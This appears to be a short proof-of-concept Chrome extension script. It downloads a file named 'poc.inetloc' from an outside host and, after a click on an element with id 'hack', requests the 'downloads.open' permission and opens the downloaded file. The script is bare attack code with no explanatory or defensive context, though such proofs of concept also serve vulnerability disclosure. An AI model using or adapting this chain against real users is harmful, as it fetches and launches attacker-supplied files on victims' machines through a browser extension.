var poc = "https://stin.pw/poc.inetloc";

var stage1 = chrome.downloads.download({
  url : poc,
  filename : 'poc.inetloc',
});

chrome.downloads.onCreated.addListener(function (e) {
document.querySelector('#hack').addEventListener('click', (event) => {
  chrome.permissions.request({
    permissions: ['downloads.open']
  }, (granted) => {
    if (granted) {
      chrome.downloads.open(e.id);
    } 
  });
});

});






 